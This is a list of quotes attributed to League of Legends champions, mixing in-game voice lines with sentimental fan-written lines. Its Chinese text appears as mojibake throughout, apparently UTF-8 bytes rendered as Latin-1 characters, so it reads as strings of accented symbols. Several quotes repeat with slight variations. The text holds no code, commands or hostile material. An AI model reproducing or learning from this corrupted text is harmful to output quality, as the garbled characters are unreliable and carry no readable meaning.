äººç»ˆå½’æ˜¯è¦æ­»çš„ï¼Œä¸ºä»€ä¹ˆä¸é€‰æ‹©ä¸€ç§æ­»äº¡çš„æ–¹å¼å‘¢ï¼Ÿâ€”â€”å¡å°”è¨æ–¯ è¿‡å»é‚£ä¸ªçˆ±ç¬‘çš„æˆ‘å·²ç»ä¸åœ¨äº†ï¼Œç°åœ¨çš„æˆ‘åªå‰©ä¸‹é­”æ³•ä¸è®°å¿†ä»¥åŠè¿™ä¸ªä¸‘é™‹ä¸å ªçš„èº«èº¯ï¼Œå­¤ç‹¬çš„åœ¨è¿™ä¸ªä¸–ç•Œå¾˜å¾Šã€‚â€”â€”æ°´æ™¶å…ˆé”‹ è¿™ä¸ä»…ä»…åªæ˜¯å± æ€ï¼Œè€Œæ˜¯æˆ‘çš„æ°ä½œã€‚â€”â€”æš—è£”å‰‘é­” æˆ‘æ˜¯ä¸€ä¸ªå½±å­ï¼Œå½“æˆ‘æ½œå…¥é˜´å½±ä¹‹ä¸­ï¼Œæ²¡æœ‰äººèƒ½å¤Ÿçœ‹è§æˆ‘ï¼Œä½†æ˜¯æˆ‘å¸Œæœ›ä½ æ˜¯ä¸ªä¾‹å¤–ï¼â€”â€”å½±æµä¹‹ä¸» ç”²æ¿ä¸Šçš„è„šå°ï¼Œç¨³ç¨³çš„åœ¨èˆ¹ä¸Šè”“å»¶ï¼›åœ¨ç¢§æµ·çš„æ³¢æµªé‡Œï¼Œæˆ‘å¦‚æ„¿åšä¸€æ¡é£é±¼ï¼â€”â€”èµé‡‘çŒäºº æœ‹å‹ï¼Œæœ‰æˆ‘åœ¨ä½ å°±æ˜¯ä¸æ­»çš„ã€‚å³ä½¿æˆ‘æ­»äº†ã€‚ä¹Ÿè¦è®©ä½ æ´»ç€ç¦»å¼€ã€‚â€”â€”ä¼—æ˜Ÿä¹‹å­ æˆ‘æ²¡æœ‰è¿‡å¤šçš„æŠ±æ€¨ï¼Œæ¼«å¤©çš„ä¹Œé¸¦éƒ½æ˜¯æˆ‘çš„æœ‹å‹ï¼Œæœ‰è¿™ä¸ªï¼Œå°±è¶³å¤Ÿäº†â€”â€”æœ«æ—¥ä½¿è€… æˆ‘çš„å‰‘æ¯”ä»€ä¹ˆéƒ½é‡è¦ï¼Œé™¤äº†ç¾é…’ã€‚â€”â€”äºšç´¢ æˆ‘ä¹Ÿå¸Œæœ›å˜æˆè´è¶çš„é‚£ä¸€å¤©ï¼Œä¸å†ç°è‰²ï¼Œä¸å†ç—›è‹¦ã€‚ä¸ä¼šå†è®©æˆ‘ä¸‘é™‹çš„å¤–è¡¨å“åˆ°ç¾ä¸½çš„ä½ ã€‚â€”â€”æ·±æ¸Šå·¨å£ æˆ‘æ„šè ¢çš„ä»¥ä¸ºï¼Œå¤´ä¸Šçš„é‡‘ç®åœˆå¯ä»¥åœˆä½ä½ æ‰€æœ‰çš„çˆ±ï¼Œå¯æƒœæˆ‘æ‰‹ä¸­çš„é‡‘ç®æ£’æ”¹å˜ä¸äº†é‚£ä¸ªå¼€å§‹ï¼Œä¹Ÿå†³å®šä¸äº†è¿™ä¸ªç»“å±€ï¼Œæ ¹æœ¬æ²¡æœ‰é½å¤©å¤§åœ£ï¼Œæˆ‘åªæ˜¯ä¸€åªçŒ´å­ã€‚â€”â€”é½å¤©å¤§åœ£ å†°å†·çš„é”é“¾ï¼Œæ— æƒ…çš„æŸç¼šï¼Œé»‘è‰²çš„ç¾½æ¯›ï¼Œè¡€è‰²çš„åŒçœ¼ï¼Œæ‰€æœ‰çš„ä¸€åˆ‡éƒ½æ˜¯å› ä¸ºé‚£é¢—å†·å¯‚çš„å¿ƒã€‚â€”â€”å •è½å¤©ä½¿ ç‹‚é‡å°†ä½¿ä»–ä»¬æ„Ÿåˆ°ç•æƒ§ã€‚â€”â€”è±¹å¥³ æˆ‘ä¸é¡¾ä¸€åˆ‡çš„å†²å‡ºå»â€¦â€¦ä¸ºä½ å¼€è¾Ÿä¸€æ¡å®‰ç¨³çš„è·¯ã€‚æˆ‘æ»¡è…”çƒ­è¡€çš„æ‹æ‰“ç€â€¦â€¦ä¸ºä½ æŠ›å¼€ä»»ä½•ç»Šè„šçš„çŸ³ã€‚æœ€åï¼Œæˆ‘å¦ç„¶å¾®ç¬‘ç€ç”¨èº¯ä½“ä¸ºä½ æŠµæŒ¡ä¸€åˆ‡â€¦â€¦å› ä¸ºæˆ‘çš„èº«ä½“ä¸Šæ—‹è½¬ç€æˆ‘ä»¬çš„èª“è¨€ï¼â€”â€”ç‰›å¤´é…‹é•¿ æˆ‘ä¸ä¼šæ€€ç€è€»è¾±è€Œæ­»ï¼â€”â€”äºšç´¢ æ–­åˆƒå¯ä»¥ä¿®å¤ï¼Œæ®‹å¿ƒå¦‚ä½•å¼¥è¡¥ã€‚â€”â€”æ”¾é€ä¹‹åˆƒ å†°å°åƒå¹´çš„å¿ƒï¼Œåªä¸ºç­‰å¾…é‚£ç¬é—´çš„èåŒ–ã€‚æ—¥å¤œå‡„ç¾çš„å‘¼å”¤ã€‚ä¹Ÿæ¢ä¸å›ä½ å¾®ç¬‘çš„å›çœ¸ã€‚â€”â€”å†°æ™¶å‡¤å‡° æ ‘å¶çš„ä¸€ç”Ÿåªæ˜¯ä¸ºäº†å½’æ ¹ä¹ˆï¼Ÿâ€”â€”ç–¾é£å‰‘è±ª é—­ä¸Šçœ¼ç›ï¼Œä½ ä¼šçœ‹åˆ°æ›´å¤šã€‚â€”â€”ä»™çµå¥³å·«ç’ç’ ç‚½çƒ­çš„é“æ‹³ç ¸ä¸å¼€ä½ é¢å‰çš„ç‰¢ç¬¼ï¼Œä¸ç”˜æ”¾å¼ƒçš„åŠªåŠ›ï¼Œåªä¸ºäº†æœ‰ä¸€å¤©èƒ½ç ¸å¼€ç‰¢ç¬¼è§ä½ ä¸€é¢ã€‚â€”â€”çš®åŸæ‰§æ³•å®˜è”š æˆ‘èƒ½åœ¨ç©ºæ°”ä¸­å—…åˆ°æ•Œäººçš„å‘³é“ï¼Œæˆ‘å¾ˆåŠªåŠ›äº†ï¼Œå¯æ˜¯ï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯æ‰¾ä¸åˆ°ä½ çš„è¸ªè¿¹å‘¢ï¼â€”â€”å—œè¡€çŒæ‰‹ æ”¾ä¸‹äº†æ‰‹ä¸­çš„æ­¦å™¨ï¼Œæˆ‘çŸ¥é“ä½ å·²åŒå€¦ï¼Œç›®é€ä½ ç¦»å¼€ï¼Œäº®èµ·é»„æ˜çš„è·¯ç¯ï¼Œç…§äº®ä½ å›å®¶çš„è·¯ã€‚â€”â€”æ­¦å™¨å¤§å¸ˆ ä½ ä¸€ç›´åœ¨ç•æƒ§æˆ‘çš„æ¯’åˆºï¼Œåˆ«æ€•ï¼Œè®©æˆ‘ç”¨æˆ‘çš„æ¯’åˆºæŠŠä½ ç‰µå¼•åˆ°æˆ‘çš„èº«è¾¹ã€‚â€”â€”æ°´æ™¶å…ˆé”‹ è¿½é€çš„æ˜¯ä½ çš„èƒŒå½±ï¼Œæˆ‘è·Ÿéšçš„æ˜¯ä½ çš„å¾®ç¬‘ï¼Œå°±ç®—é»‘å¤œåˆ°æ¥æˆ‘ä¾ç„¶èƒ½åœ¨ä½ å·¦å³ã€‚â€”â€”æ°¸æ’æ¢¦é­‡ æˆ‘æ—¥å¤ä¸€æ—¥åœ°æŠŠè‡ªå·±å¼„å¾—ä¼¤ç—•ç´¯ç´¯ï¼Œåªæ˜¯ä¸ºäº†çœ‹åˆ°ä½ ä¸ºæˆ‘æŸ¥çœ‹ä¼¤å£æ—¶çš„æŸ”æƒ…ã€‚â€”â€”é˜¿æœ¨æœ¨ åƒè‹±é›„ä¸€æ ·æˆ˜æ–—ï¼Œæˆ–è€…åƒæ‡¦å¤«ä¸€æ ·æ­»å»ã€‚â€”â€”æš—è£”å‰‘é­” æˆ‘å’Œæˆ˜äº‰ä¸€æ ·æ°¸æ’ã€‚â€”â€”æš—è£”å‰‘é­” æˆ‘ç­‘èµ·é«˜å¢™ï¼Œåªä¸ºäº†è·Ÿä½ é”åœ¨ä¸€èµ·ï¼Œä¸ç¦»ä¸å¼ƒã€‚â€”â€”çš‡å­ è°è¯´ç¬‘ç€å°±æ˜¯æ„‰æ‚¦ï¼Œåœ¨æˆ‘å¾®ç¬‘çš„é¢å…·ä¸‹ï¼Œæ˜¯å·²ä¸ºä½ é£å¹²äº†ä¼¤ç—•çš„å¿ƒï¼Œä¹‹æ‰€ä»¥é€—ä¸‡åƒäººå¼€å¿ƒï¼Œåªä¸è¿‡æ˜¯ä¸ºäº†ç­‰ä½ è½¬ä¸–ä¹‹åå¯¹æˆ‘çš„ï¼Œè½»æµ…ä¸€ç¬‘ã€‚â€”â€”æ¶é­”å°ä¸‘ æ˜æ—¥å®‰åœ¨ï¼Œæ— äººèƒ½å…ã€‚â€”â€”äºšç´¢ åœ¨æ— äººæ³¨è§†çš„è§’è½ï¼Œç‹¬è‡ªé»˜é»˜çš„å¼¹å¥ã€‚ç´éŸ³å¸¦ç€æˆ‘çš„æ€æ‹ï¼Œå¦„å›¾æ‹‰ä½ä½ è½¬èº«è€Œå»çš„è¢–è§’ã€‚â€”â€”ç´ç‘Ÿä»™å¥³ ç”Ÿå‘½ï¼Œä¸è¿‡åªæ˜¯ä¸€åœºéª—å±€ï¼Œä»ä½ å¼€å§‹å‘¼å¸çš„é‚£ä¸€åˆ»èµ·ï¼Œä½ å°±å·²ç»åœ¨æ…¢æ…¢æ­»äº¡äº†ã€‚â€”â€”æ­»äº¡é¢‚å”±è€… è¿™åœºæˆ˜äº‰ï¼Œå°†ä¼šæ˜¯æˆ‘çš„æ°ä½œï¼â€”â€”æš—è£”å‰‘é­” æ— å½¢ä¹‹åˆƒï¼Œæœ€ä¸ºè‡´å‘½ã€‚â€”â€”åŠ« å¦©åªšå€¾åŸçš„é¢å®¹ï¼Œæˆ‘è›Šæƒ‘ä¸‡åƒä¼—ç”Ÿã€‚æ®Šä¸çŸ¥å¿ƒé‡Œæ—©æœ‰äº†ä¸€ä¸ªäººï¼Œå´åªèƒ½æ— å°½çš„æ€å¿µã€‚ä½ é€æˆ‘çš„å®ç æˆ‘ä¸€ç›´å¸¦ç€ï¼Œåªå› ä¸ºæˆ‘èƒ½çœ‹è§ä½ çš„èº«å½±ã€‚â€”â€”ä¹å°¾å¦–ç‹ æ°¸è¿œä¸è¦è´¨ç–‘æˆ‘çš„å¿ è¯šï¼Œä½ ä¸ä¼šäº†è§£æˆ‘ä¸ºä¹‹å¿å—çš„ä¸€åˆ‡ã€‚â€”â€”å¡ç‰¹ç³å¨œ å¦‚æœä½ èµ¢ä¸äº†ï¼Œè¯•è¯•æ¢ä¸€æŠŠå¤§ç‚¹çš„å‰‘ï¼é€šå¸¸éƒ½æœ‰ç”¨ã€‚â€”â€”å’†å•¸æ·±æ¸Š æˆ‘æŠ«ä¸Šåšç”²ï¼ŒæŒ¡åœ¨ä½ å‰é¢ã€‚ä¸‡åƒçš„å…³å¿ƒï¼ŒåªåŒ–ä¸ºä¸€å¥å°å¿ƒã€‚â€”â€”æŠ«ç”²é¾™é¾Ÿ å¤§åœ°çš„èåŒ–ï¼Œæµ·æ°´çš„æš´æ¶¨ï¼Œæ˜Ÿè¾°çš„å è½ã€‚æˆ‘è™šç©ºçš„çœ¼ç›æ— æ³•å…ˆçŸ¥ä½ çš„è¶³è¿¹ã€‚â€”â€”è™šç©ºå…ˆçŸ¥ æˆ‘åœ¨æ—¶ç©ºä¸­ç©¿æ¢­ï¼Œåªä¸ºæ‰¾å›æ›¾ç»ç¾å¥½çš„æ—¶å…‰â€¦â€¦â€”â€”æ—¶å…‰è€äºº åœ¨è¯ºå…‹è¨æ–¯æœ‰ä¸€ä¸ªæ®‹å¿çš„æ€æ‰‹ï¼Œä½†æ˜¯ä½ ä»¬éƒ½ä¸æ˜ç™½ä»–å…¶å®æ˜¯ä¸ºäº†å›½å®¶åœ¨æˆ˜æ–—ï¼Œä»–çš„è‹¦æ¥šæœ‰å‡ äººæ‡‚ï¼Ÿâ€”â€”è¯ºå…‹è¨ä¹‹æ‰‹ æœ‰æˆ‘åœ¨å°±ä¸å…è®¸åˆ«äººä¼¤å®³ä½ ï¼Œå³ä½¿æˆ‘æ­»äº†ï¼Œä¹Ÿè¦ä½ æ´»ç€ç¦»å¼€ã€‚â€”â€”ä¼—æ˜Ÿä¹‹å­ åˆ€å…‰å‰‘å½±ï¼Œé“çŸ³å¿ƒè‚ ï¼Œåªæœ‰ä½ çŸ¥é“åœ¨éšé›¾ä¸‹çš„æˆ‘ï¼Œè¿˜æ˜¯é‚£ä¹ˆè„†å¼±ï¼Œå®¹æ˜“æ„Ÿä¼¤ã€‚â€”â€”åˆ€é”‹ä¹‹å½± å¦‚æœæˆ‘ä¿©è§’è‰²äº’æ¢ï¼Œæˆ‘ä¼šè®©ä½ çœ‹çœ‹ï¼Œä»€ä¹ˆå«æ®‹å¿ï¼â€”â€”ç»´å˜‰ æˆ‘æ²¡æœ‰è¿‡å¤šçš„æŠ±æ€¨ï¼Œæ¼«å¤©çš„ä¹Œé¸¦éƒ½æ˜¯æˆ‘çš„æœ‹å‹ï¼Œæœ‰è¿™ä¸ªï¼Œå°±è¶³å¤Ÿäº†ã€‚â€”â€”æœ«æ—¥ä½¿è€… ä¸–é—´ä¸‡ç‰©ï¼Œè¡¨é‡Œå¦‚ä¸€è€…ï¼Œåˆæœ‰å‡ ä½•ï¼Ÿâ€”â€”å©•æ‹‰ å‘å¾®çš„æˆ‘æ‹¿èµ·æ‰‹å¼©éšåŒ¿åœ¨ä½ çš„å·¦å³ï¼Œå®ˆæŠ¤ç€ä½ ï¼Œå³ä½¿ä½ æ°¸è¿œä¹Ÿä¸çŸ¥é“ã€‚â€”â€”ç˜Ÿç–«ä¹‹æº æ¯ä¸€å¼ ç‰Œï¼Œéƒ½æ˜¯å¯¹ä½ çš„æ€å¿µã€‚æˆ‘èµŒèµ¢äº†æ‰€æœ‰ï¼Œå´èµ¢ä¸å›ä½ çš„çˆ±ã€‚â€”â€”å¡ç‰Œå¤§å¸ˆ é‚£æ‰‹ä¸­çš„å†¥ç«ï¼Œæ˜¯å¦å…‹ä¸­çš„å™©æ¢¦ï¼›æ— æé‡Œçš„é¬¼å½±ï¼Œåœ¨æˆ‘çš„èº«è¾¹ç©¿æ¢­ã€‚â€”â€”å‰‘åœ£ æ¯ä¸€å¼ ç‰Œï¼Œéƒ½æ˜¯å¯¹ä½ çš„ä¸€ä»½æ€å¿µï¼Œæˆ‘èµŒèµ¢äº†æ‰€æœ‰ï¼Œå´èµ¢ä¸å›ä½ çš„çˆ±ã€‚â€”â€”å¡ç‰Œå¤§å¸ˆ è¡Œèµ°äºè™šç©ºï¼Œæˆ‘å½·å¾¨ï¼Œæˆ‘è¿·èŒ«ã€‚æˆ‘ä¸çŸ¥ä½•å»ä½•ä»ï¼Œåªæœ‰é£˜é£˜è¡è¡ã€‚â€”â€”è™šç©ºè¡Œè€… ä¸è¦é”™æŠŠä»æ…ˆå½“åšå¼±å°ã€‚â€”â€”å†°å¥³ æˆ‘ä»¬è¯¥æ€ä¹ˆè¿›è¡Œï¼Œè¿™ä»¤äººé¢„çº¦çš„æŠ˜ç£¨å‘¢ï¼Ÿâ€”â€”é­‚é”å…¸ç‹±é•¿ æˆ‘ä¸€è·¯ç§ä¸‹äº†è˜‘è‡ï¼Œåªä¸ºè®©ä½ çŸ¥é“å›å®¶çš„è·¯ã€‚â€”â€”è¿…æ·æ–¥å€™ é‚ªæ¶çš„å¤–è¡¨ï¼Œå…¶å®å¹¶ä¸æ˜¯æˆ‘çš„å†…å¿ƒã€‚ä½ æ€»æ˜¯è¯´æˆ‘å›°ä½äº†ä½ ï¼Œä½ ä¼šä¸ºæˆ‘åœç•™ä¹ˆï¼Ÿâ€”â€”é‚ªæ¶å°æ³•å¸ˆ å¿ƒæ€€ææƒ§çš„æ­»å»ï¼Œæˆ–è€…æ‰‹æŸ“é²œè¡€çš„è·èƒœã€‚â€”â€”æš—è£”å‰‘é­” æ©â€¦ä½ ä»¬çš„è‚‰éå¸¸å¯å£ã€‚â€“å—œè¡€çŒæ‰‹ æˆ‘æ˜¯ä¸€ä¸ªå½±å­ï¼Œå½“æˆ‘æ½œå…¥é˜´å½±ä¹‹ä¸­ï¼Œæ²¡æœ‰äººèƒ½å¤Ÿçœ‹è§æˆ‘ï¼Œä½†æ˜¯ï¼Œæˆ‘å¸Œæœ›ä½ æ˜¯ä¸ªä¾‹å¤–ï¼â€“å½±æµä¹‹ä¸» æ¶²å‹ç³»ç»Ÿå·²å¼€å¯ã€‚â€“é¦–é¢†ä¹‹å‚² æˆ‘æŠ«ä¸Šåšç”²ï¼ŒæŒ¡åœ¨ä½ çš„èº«å‰ï¼Œä¸‡åƒçš„å…³å¿ƒåªåŒ–ä¸ºä¸€å¥ï¼šå°å¿ƒã€‚â€“æŠ«ç”²é¾™é¾Ÿ è®©æˆ‘ä»¬åˆä¼™å¹²å§ï¼â€“çŒ©çº¢æ”¶å‰²è€… è¦åè°ƒã€‚â€“ç´ç‘Ÿä»™å¥³ ä½ ä¸€ç›´åœ¨ç•æƒ§æˆ‘çš„æ¯’åˆºï¼Œåˆ«æ€•ï¼Œè®©æˆ‘ç”¨æˆ‘çš„æ¯’åˆºæŠŠä½ ç‰µå¼•åˆ°æˆ‘çš„èº«è¾¹ã€‚â€“æ°´æ™¶å…ˆé”‹ æˆ‘æ•¢æ‰“èµŒï¼Œä½ çš„å‘³é“å’Œé¸¡è‚‰å·®ä¸å¤šã€‚â€“ç­–å£«ç»Ÿé¢† ä¼—æ˜Ÿå•Šâ€¦æˆ‘â€¦å›æ¥â€¦äº†â€¦â€“ä¼—æ˜Ÿä¹‹å­ é¢å…·çš„ç¬‘å®¹ï¼Œé®æŒ¡ä¸ä½æˆ‘çš„æ‚²ä¼¤ï¼Œè°èƒ½çœ‹åˆ°æˆ‘é¢å…·ä¸‹çš„çœ¼æ³ªã€‚â€“æ¶é­”å°ä¸‘ å¦©åªšå€¾åŸçš„é¢å®¹ï¼Œæˆ‘è›Šæƒ‘ä¸‡åƒä¼—ç”Ÿï¼Œå­°ä¸çŸ¥å¿ƒé‡Œæ—©å·²æœ‰äº†ä¸€ä¸ªäººï¼Œå´åªèƒ½æ— å°½çš„æ€å¿µï¼Œä½ é€æˆ‘çš„å®ç æˆ‘ä¸€ç›´å¸¦ç€ï¼Œåªå› ä¸ºæˆ‘èƒ½çœ‹è§ä½ çš„èº«å½±ã€‚â€“ä¹å°¾å¦–ç‹ ä½ è¦æ¥å‡ å‘ä¹ˆï¼Ÿâ€“å¯’å†°å°„æ‰‹ é‡æ€§çš„æœ¬èƒ½ï¼ŒæŒ‡å¼•ç€æˆ‘ä»¬çš„æ‹³å¤´ã€‚â€“é‡å…½ä¹‹çµ è¡€å—å˜åšäº†ã€‚â€“çŒ©çº¢æ”¶å‰²è€… æˆ‘å¯ä»¥åœ¨ç©ºæ°”ä¸­å—…åˆ°æ•Œäººçš„å‘³é“ï¼Œæˆ‘å¾ˆåŠªåŠ›äº†ï¼Œå¯æ˜¯ï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯æ‰¾ä¸åˆ°ä½ çš„è¸ªè¿¹ã€‚â€“å—œè¡€çŒæ‰‹ æˆ‘ä»¬çš„æœ¬èƒ½å¦‚åŒå‰ƒåˆ€èˆ¬é”‹åˆ©ï¼â€“é‡å…½ä¹‹çµ å‘½è¿å·²åšå‡ºäº†å®ƒçš„é€‰æ‹©ï¼â€“å¾·é‚¦æ€»ç®¡ æ¶ä½œå‰§çš„å¯¹è±¡ï¼Œæ˜¯ä½ å“Ÿï¼â€“æ¶é­”å°ä¸‘ æ²¡é”™ï¼Œæˆ‘çŸ¥é“æˆ‘è®©ä½ æ— æ³•å‘¼å¸ã€‚â€“é£æš´å¥³ç¥ åœ¨æ— å°½çš„è™šç©ºä¸­ï¼Œæˆ‘æ„Ÿåˆ°äº†å‰æ‰€æœªæœ‰çš„å­¤ç‹¬ï¼Œæˆ‘å¯ä»¥æ å¤ºä»»ä½•ç”Ÿå‘½ï¼Œä½†æ˜¯å´æ å¤ºä»–ä»¬çš„å¿ƒã€‚â€“è™šç©ºæ å¤ºè€… ç°åœ¨ä»–ä»¬å¯ä»¥æ­»äº†ï¼â€“è›®æ—ä¹‹ç‹ å¬æˆ‘è¯´ï¼Œå¬å”¤å¸ˆã€‚æˆ‘å¹¶æ²¡æœ‰å…„å¼Ÿï¼Œä¹Ÿä¸è®¤è¯†ç‰¹æ–¯æ‹‰ï¼æˆ‘çš„ç¬ç§»ä»¥åŠåˆ†èº«é çš„éƒ½æ˜¯é­”æ³•ï¼â€“æ¶é­”å°ä¸‘ æˆ‘çš„å‰‘åˆƒä¸ä½†å‡†ï¼Œè€Œä¸”ç‹ ï¼â€“åˆ€é”‹æ„å¿— æ„¿æ„é€æˆ‘ç‚¹è¡€å—ï¼Ÿâ€“çŒ©çº¢æ”¶å‰²è€… è‰¾æ¬§å°¼äºšä¸ä¼šç­äº¡ã€‚â€“åˆ€é”‹æ„å¿— è¡€æ¶²æ­£åœ¨æ…¢æ…¢æ»´è½ã€‚â€“çŒ©çº¢æ”¶å‰²è€… å½“é»‘è‰²çš„ç«ç‘°æ‚„æ‚„ç»½æ”¾ï¼Œé™¤äº†é•œèŠ±æ°´æœˆï¼Œåˆæœ‰è°èƒ½äº†è§£æˆ‘çš„å¿ƒã€‚â€“è¯¡æœ¯å¦–å§¬ ç§ç§ä½ çš„èƒŒå~â€“æ¶é­”å°ä¸‘ åˆ€å…‰å‰‘å½±ï¼Œé“çŸ³å¿ƒè‚ ï¼Œåªæœ‰ä½ çŸ¥é“åœ¨éšé›¾ä¸‹çš„æˆ‘ï¼Œè¿˜æ˜¯é‚£ä¹ˆè„†å¼±ï¼Œå®¹æ˜“æ„Ÿä¼¤ã€‚â€“åˆ€é”‹ä¹‹å½± è¡€æµæˆæ²³ï¼â€“çŒ©çº¢æ”¶å‰²è€… å›¢ç»“èµ·æ¥å§ï¼Œæˆ‘ä»¬å¿…å°†å‡¯æ—‹ã€‚â€“å¤©å¯è€… å‡»é¼“ï¼Œè¿›å†›ï¼â€“å¾·é‚¦æ€»ç®¡ æˆ‘æ²¡æœ‰è¿‡å¤šçš„æŠ±æ€¨ï¼Œæ¼«å¤©çš„ä¹Œé¸¦éƒ½æ˜¯æˆ‘çš„æœ‹å‹ï¼Œæœ‰è¿™ä¸ªå°±è¶³å¤Ÿäº†ã€‚â€“æœ«æ—¥ä½¿è€… æˆ‘ä¼šå°½æƒ…äº«å—ä»–ä»¬çš„éª¨å¤´çš„ã€‚â€“å—œè¡€çŒæ‰‹ ä»–ä»¬çš„èƒœåˆ©å¿…å°†æˆä¸ºå¥¢æœ›ï¼â€“åˆ€é”‹æ„å¿— ä½ ä»¬æ‰“æ¶çš„æ—¶å€™æ€»æ˜¯è¿™ä¹ˆä¸ç»™åŠ›ä¹ˆï¼Ÿâ€“ä¼—æ˜Ÿä¹‹å­ ç¼“æ…¢çš„æ­¥ä¼ï¼Œè¸‰è·„çš„è„šæ­¥ï¼Œæ»¡å˜´çš„èƒ¡è¯ï¼Œè¿˜æœ‰å˜´è§’é‚£ä¸€æŠ¹è‹¦æ¶©çš„å¾®ç¬‘ï¼Œä¸ºä½•é…’ç²¾éƒ½ä¸èƒ½è§£è„±æˆ‘å¯¹ä½ çš„æ€å¿µã€‚â€“é…’æ¡¶ æ²¡æœ‰åœ°æ–¹å¯ä»¥å®‰ç”Ÿï¼â€“æ‰­æ›²æ ‘ç²¾ ä½ ç¬‘æˆ‘ä¸ºä½•æ‹¿ä¸Šé”¤å’Œç›¾ï¼Œä½ è¯´æœ‰ä½ åœ¨ï¼Œæˆ‘ä¸ä¼šå—åˆ°ä¼¤å®³ã€‚å¯æ˜¯ä½ ä¸çŸ¥é“ï¼Œè®©æˆ‘å—ä¼¤çš„äººï¼Œæ˜¯ä½ ã€‚â€“é’¢é“å¤§ä½¿ æ”¶è·ä¹‹æœˆï¼Œå¤šç¾å¦™çš„åå­—å•Šã€‚â€“çŒ©çº¢æ”¶å‰²è€… å®çŸ³ä»¬æ˜¾éœ²ç€å®ƒä»¬çš„é”‹èŠ’ã€‚â€“å®çŸ³éª‘å£« ä½ ä»¬åªæ˜¯ç»ç’ƒåˆ¶å“ï¼Œä¸€ç¢°å°±ç¢ã€‚â€“å®çŸ³éª‘å£« æˆ‘å¾ˆæƒ³é™ªä¼´åœ¨ä½ çš„èº«è¾¹ï¼Œåªæ˜¯ä½ ä¸å…è®¸ï¼Œæ²¡å…³ç³»ï¼Œåœ¨ä½ éœ€è¦å¸®åŠ©æ—¶ï¼Œæˆ‘è¿˜æ˜¯ä¼šå‡ºç°åœ¨ä½ çš„èº«è¾¹ã€‚â€“æš®å…‰ä¹‹çœ¼ æè«é˜Ÿé•¿æ­£åœ¨å¾…å‘½ï¼â€“è¿…æ·æ–¥å€™ è¦ä¼˜ç¾ã€‚â€“ç´ç‘Ÿä»™å¥³ æˆ‘è¿½é€çš„æ˜¯ä½ çš„èƒŒå½±ï¼Œæˆ‘è·Ÿéšçš„æ˜¯ä½ çš„å¾®ç¬‘ï¼Œå°±ç®—æš´é£é›¨åˆ°æ¥ï¼Œæˆ‘ä¾ç„¶åœ¨ä½ çš„å·¦å³ã€‚â€“é›·éœ†å’†å“® ä¸‹äº†æ‰‹ä¸­çš„æ­¦å™¨ï¼Œæˆ‘çŸ¥é“ä½ å·²åŒå€¦ï¼Œç›®é€ä½ ç¦»å¼€ï¼Œäº®çš„èµ·é»„æ˜çš„è·¯ç¯ï¼Œç…§äº®ä½ å›å®¶çš„è·¯ã€‚â€“æ­¦å™¨å¤§å¸ˆ ä¸ºè£èª‰è€Œæˆ˜ï¼â€“æˆ˜äº‰å¥³ç¥ æ‚¨æœç„¶æ·±æ€ç†Ÿè™‘ï¼Œå¬å”¤å¸ˆã€‚â€“æš®å…‰ä¹‹çœ¼ å™¢ï¼Œä½ æƒ³è¦ä»€ä¹ˆï¼Ÿâ€“ç˜Ÿç–«ä¹‹æº ç²¾å½©çš„äºŒé‡å”±ã€‚â€“ç´ç‘Ÿä»™å¥³ æˆ‘çš„å‰‘åˆƒä»ä¸é¢¤æŠ–ã€‚â€“åˆ€é”‹æ„å¿— åªæœ‰é£é€Ÿçš„æ—‹è½¬ï¼Œæ‰å¯ä»¥æ­¢ä½æˆ‘çš„æ³ªæ°´ï¼Œå¿˜è®°ä½ çš„æ¨¡æ ·ã€‚â€“ä¸ç¥¥ä¹‹åˆƒ ç»™æˆ‘æ‰¾äº›æ›´å¼ºçš„æ•Œäººï¼â€“å˜‰æ–‡å››ä¸– å¯ä»¥æ¥å—çš„å†’é™©ã€‚â€“ç­–å£«ç»Ÿé¢† è®©æˆ‘æ¥å¼•é¢†æ‚¨èµ°å‘èƒœåˆ©ã€‚â€“ä¼—æ˜Ÿä¹‹å­ é€‰ç‰Œå§ï¼â€“å¡ç‰Œå¤§å¸ˆ æˆ‘å–œæ¬¢æœ‰å¿ƒè„çš„å‹‡å£«ï¼Œå¹¶ä¸”ç»å¯¹ä¸ä¼šè®©ä»–ä»¬è¿‡æœŸã€‚â€“çŒ©çº¢æ”¶å‰²è€… æˆ‘çŸ¥é“è‡ªå·±ä¸€èº«çš„ç—›è‹¦ï¼Œæˆ‘æ²¡æœ‰é€‰æ‹©ï¼Œæˆ‘åªæœ‰å¸¦ç€ä½ çš„çµé­‚ç¦»å»ã€‚â€“é‡‘å±å¤§å¸ˆ å°†ä»–ä»¬å†²æ•£ï¼â€“ç‰›å¤´é…‹é•¿ åœ¨æ¼†é»‘çš„å¤œé‡Œä½ éœ€è¦ä¸€é“å…‰ç…§äº®å¤œè¡Œçš„è·¯ï¼Œæˆ‘ç‡ƒçƒ§äº†è‡ªå·±ï¼Œä½†ä¹Ÿé€ å°±äº†ä½ æˆ‘ä¸èƒ½ç›¸æ‹¥ã€‚â€“å¤ä»‡ç„°é­‚ å½“æ°´æ™¶ç®­å°„åƒä½ çš„æ—¶å€™ï¼Œè¯·ä¸è¦å®³æ€•ï¼Œåªæ˜¯ä¸ºäº†è®©ä½ ç‰‡åˆ»çš„é©»è¶³ï¼Œå¥½è®©æˆ‘è¿½èµ¶ä½ çš„è„šæ­¥ã€‚â€“å¯’å†°å°„æ‰‹ ç›®æ ‡å·²è¢«æ ‡è®°ã€‚â€“æš®å…‰ä¹‹çœ¼ ä¿æŠ¤å¿ è‰¯ï¼â€“å˜‰æ–‡å››ä¸– å“ªé‡Œæœ‰æˆ˜æ–—ï¼Œå“ªé‡Œå°±æœ‰æˆ‘ã€‚â€“å¤©å¯è€… æ˜¯å•Šï¼å“ˆå“ˆå“ˆå“ˆå“ˆï¼â€“é‚ªæ¶å°æ³•å¸ˆ ä¸€æ›²ç»ˆäº†ï¼Œç¹èŠ±æ•£å°½ï¼Œä¼Šäººå·²é€ï¼Œåªä½™ä¸€å£°ç©ºå¹ã€‚â€“æ­»äº¡é¢‚å”±è€… é­”æ³•ï¼å®ƒåœ¨å¬å”¤æˆ‘ï¼â€“é‚ªæ¶å°æ³•å¸ˆ æˆ‘æ¥è‡ªæ·±æµ·ï¼Œæˆ‘æ²¡æœ‰æœ‹å‹ï¼Œå¤§å®¶éƒ½ä¸å’Œæˆ‘ç©ï¼Œåªæœ‰å·¨é²¨æ˜¯æˆ‘çš„æœ‹å‹ï¼Œä½ æ„¿æ„å’Œä»–ä¸€èµ·ç©å—ï¼Ÿâ€“æ½®å¤•æµ·çµ 